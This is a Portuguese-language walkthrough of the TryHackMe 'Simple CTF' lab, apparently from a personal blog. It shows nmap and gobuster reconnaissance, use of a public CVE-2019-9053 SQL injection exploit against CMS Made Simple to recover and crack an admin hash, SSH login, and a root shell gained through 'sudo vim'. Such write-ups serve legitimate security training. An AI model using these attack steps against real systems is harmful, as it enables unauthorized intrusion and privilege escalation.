---
title: "TryHackMe - Simple CTF"
published: 2025-02-25
description: "Walkthrough da máquina Simple CTF do TryHackMe, explorando a CVE-2019-9053 (SQLi) no CMS Made Simple e escalando privilégios com sudo vim."
image: "https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png"
tags: ["tryhackme", "ctf", "walkthrough", "nmap", "sqli", "cve", "vim", "privesc"]
category: "TryHackMe"
draft: false
---

# TryHackMe - Simple CTF

:::note
**Resumo da Máquina**
- **IP:** `10.201.34.55`
- **SO:** Ubuntu Linux
- **Vetor de Ataque:** SQL Injection no CMS Made Simple (CVE-2019-9053) para obter credenciais, seguido de escalação de privilégios via `sudo vim`.
:::

**Tags:** `#ctf` `#walkthrough` `#nmap` `#sqli` `#cve` `#vim` `#privesc`

## 1. Reconhecimento e Enumeração

O reconhecimento inicial revelou um firewall que filtra a maioria das portas. Foi necessário um escaneamento mais robusto para identificar os serviços em execução.

### 1.1. Varredura com Nmap
Após tentativas iniciais com resultados filtrados, utilizei um escaneamento Nmap mais completo para garantir a descoberta dos serviços. Os parâmetros `-sC` (scripts padrão), `-sV` (versões) e `-Pn` (ignorar descoberta de host) foram essenciais.

```bash
nmap -T4 -sC -sV -Pn -oN nmap/initial 10.201.34.55
```

**Resultado:**
```text
Nmap scan report for 10.201.34.55
Host is up (0.29s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|_  ...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

:::tip
**Pontos de Interesse Encontrados:**
- **Porta 21:** FTP (`vsftpd 3.0.3`) com login anônimo habilitado.
- **Porta 80:** HTTP (`Apache httpd 2.4.18`).
- **Porta 2222:** SSH (`OpenSSH 7.2p2`) - A porta de serviço mais alta.
:::

### 1.2. Enumeração de Diretórios Web
Para explorar o servidor web, usei o **GoBuster** para encontrar diretórios ocultos.

```bash
gobuster dir -u http://10.201.34.55 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

O resultado mais relevante foi o diretório `/simple`.

## 2. Exploração (SQL Injection)

### 2.1. Identificação da Vulnerabilidade
Ao acessar `http://10.201.34.55/simple`, o rodapé da página revelou a tecnologia e a versão em uso: **CMS Made Simple version 2.2.8**.

Uma rápida pesquisa por essa versão levou à descoberta de uma vulnerabilidade de **SQL Injection não autenticada**, registrada como **[CVE-2019-9053](https://www.exploit-db.com/exploits/46635)**.

### 2.2. Execução do Exploit
Encontrei um script de exploração funcional no GitHub. O script permite extrair o hash da senha do administrador e, em seguida, quebrá-lo usando uma wordlist.

```bash
python3 exploit.py -u http://10.201.34.55/simple --crack -w /usr/share/wordlists/rockyou.txt
```

**Resultado do Exploit:**
```text
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

As credenciais obtidas foram `mitch`:`secret`.

## 3. Acesso Inicial e Enumeração Interna

Com as credenciais em mãos, o próximo passo foi acessar a máquina via SSH na porta `2222`.

### 3.1. Conexão SSH
```bash
ssh mitch@10.201.34.55 -p 2222
```

### 3.2. Capturando a Flag do Usuário
Após o login, a flag do usuário estava no diretório home.

```bash
$ ls
user.txt
$ cat user.txt
```

:::important
**user.txt:** `...user_flag...`
:::

### 3.3. Enumeração de Usuários
Verifiquei o diretório `/home` e encontrei outro usuário na máquina.

```bash
$ pwd
/home/mitch
$ cd ..
$ ls
mitch  sunbath
```

O outro usuário é o **sunbath**.

## 4. Escalação de Privilégios

Para obter acesso root, verifiquei as permissões de `sudo` do usuário `mitch`.

### 4.1. Identificando o Vetor
O comando `sudo -l` revela o que um usuário pode executar como superusuário.

```bash
$ sudo -l
```

:::warning
**Vetor Encontrado:** O usuário `mitch` pode executar o editor de texto **Vim** como `root` e sem precisar de senha (`NOPASSWD`).
:::

### 4.2. Obtendo um Shell Root
O **Vim** pode ser usado para executar comandos do sistema. O site [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo) mostra como explorar essa permissão para obter um shell.

Executei o seguinte comando para abrir um shell como root a partir do Vim:
```bash
$ sudo vim -c ':!/bin/sh'
```

Isso me deu um shell com privilégios de root.
```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3. Capturando a Flag Root
Finalmente, naveguei até o diretório `/root` para encontrar a última flag.

```bash
cd /root
ls
root.txt
cat root.txt
```

:::important
**root.txt:** `...root_flag...!`
:::
